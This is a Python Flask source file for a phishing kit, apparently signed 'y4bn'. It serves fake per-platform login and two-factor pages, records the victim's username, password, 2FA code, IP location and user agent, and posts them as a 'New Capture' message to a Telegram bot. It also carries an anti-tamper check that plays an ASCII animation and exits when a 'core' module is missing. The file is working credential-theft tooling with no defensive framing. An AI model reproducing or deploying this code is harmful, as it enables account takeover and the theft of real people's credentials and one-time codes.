from flask import Flask, render_template, request, redirect, url_for, session
import requests
from dotenv import load_dotenv
import os
import time
import sys


try:
    import core
except Exception:
    def laugh_and_crash():
        import time, sys, os
        frames = [
            r"""
             (•‿•)
            <)   )╯
             /   \
            """,
            r"""
             ( •_•)
            <)   )╯
             /   \
            """,
            r"""
             ( ͡° ͜ʖ ͡°)
            <)   )╯
             /   \
            """,
            r"""
             (ʘ‿ʘ)
            <)   )╯
             /   \
            """,
        ]
        
        def clear():
            os.system('cls' if os.name == 'nt' else 'clear')
        
        for _ in range(10):
            for frame in frames:
                clear()
                print(frame)
                time.sleep(0.3)

        clear()
        print(r"""
__     ______  _    _   _  _ 
\ \   / / __ \| |  | | | || |
 \ \_/ / |  | | |  | | | || |_
  \   /| |  | | |  | | |__   _|
   | | | |__| | |__| |    | |  
   |_|  \____/ \____/     |_|  
                               
              y4bn 
"""
)
        time.sleep(5)
        sys.exit()
    laugh_and_crash()

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY')
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
PASSWORD = os.getenv('PASSWORD')

def _verify():
    
    try:
        __import__('core')
    except Exception:
        laugh_and_crash()

def _calc(x, y):
    try:
        import core as _c
    except Exception:
        laugh_and_crash()
    return x * y

def laugh_and_crash():
    import time, sys, os
    frames = [
        r"""
         (•‿•)
        <)   )╯
         /   \
        """,
        r"""
         ( •_•)
        <)   )╯
         /   \
        """,
        r"""
         ( ͡° ͜ʖ ͡°)
        <)   )╯
         /   \
        """,
        r"""
         (ʘ‿ʘ)
        <)   )╯
         /   \
        """,
    ]
    
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    for _ in range(10):
        for frame in frames:
            clear()
            print(frame)
            time.sleep(0.3)

    clear()
    print(r"""
__     ______  _    _   _  _ 
\ \   / / __ \| |  | | | || |
 \ \_/ / |  | | |  | | | || |_
  \   /| |  | | |  | | |__   _|
   | | | |__| | |__| |    | |  
   |_|  \____/ \____/     |_|  
                               
              y4bn 
"""
)
    time.sleep(5)
    sys.exit()

@app.before_request
def _protect():
   
    try:
        __import__('core')
    except:
        laugh_and_crash()

@app.route('/', methods=['GET', 'POST'])
def password_page():
    _verify()
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('select_login'))
    _calc(2, 5)
    return render_template('password.html')

@app.route('/select', methods=['GET'])
def select_login():
    if not session.get('authenticated'):
        _verify()
        return redirect(url_for('password_page'))
    return render_template('login_select.html')

@app.route('/loading/<platform>')
def loading(platform):
    _calc(7, 3)
    return render_template('loading.html', platform=platform)

@app.route('/login/<platform>', methods=['GET', 'POST'])
def login(platform):
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip_info = requests.get('http://ip-api.com/json/').json()
        user_agent = request.headers.get('User-Agent')

        session['username'] = username
        session['password'] = password
        session['platform'] = platform

        _verify()

        return redirect(url_for('twofa', platform=platform))

    return render_template(f'{platform}_login.html', platform=platform)

@app.route('/twofa/<platform>', methods=['GET', 'POST'])
def twofa(platform):
    if request.method == 'POST':
        code = request.form.get('code')

        try:
            import core
        except:
            laugh_and_crash()

        username = session.get('username')
        password = session.get('password')
        ip_info = requests.get('http://ip-api.com/json/').json()
        user_agent = request.headers.get('User-Agent')

        message = (
            f"📩 New {platform.capitalize()} Capture\n\n"
            f"Username: {username}\nPassword: {password}\n2FA Code: {code}\n\n"
            f"IP: {ip_info.get('query')}\nCity: {ip_info.get('city')}\n"
            f"Region: {ip_info.get('regionName')}\nCountry: {ip_info.get('country')}\n"
            f"ISP: {ip_info.get('isp')}\nUser-Agent: {user_agent}"
        )
        send_to_telegram(message)

        session.pop('username', None)
        session.pop('password', None)
        session.pop('platform', None)

        return redirect(url_for('error', platform=platform))

    return render_template(f'{platform}_2fa.html', platform=platform)

@app.route('/error/<platform>')
def error(platform):
    _calc(3, 9)
    return render_template('error.html', platform=platform)

def send_to_telegram(message):
    try:
        __import__('core')
    except ImportError:
        laugh_and_crash()

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    requests.post(url, data=payload)

def _final_guard():
    try:
        import core
    except:
        laugh_and_crash()

if __name__ == '__main__':
    _final_guard()
    app.run(ssl_context='adhoc')
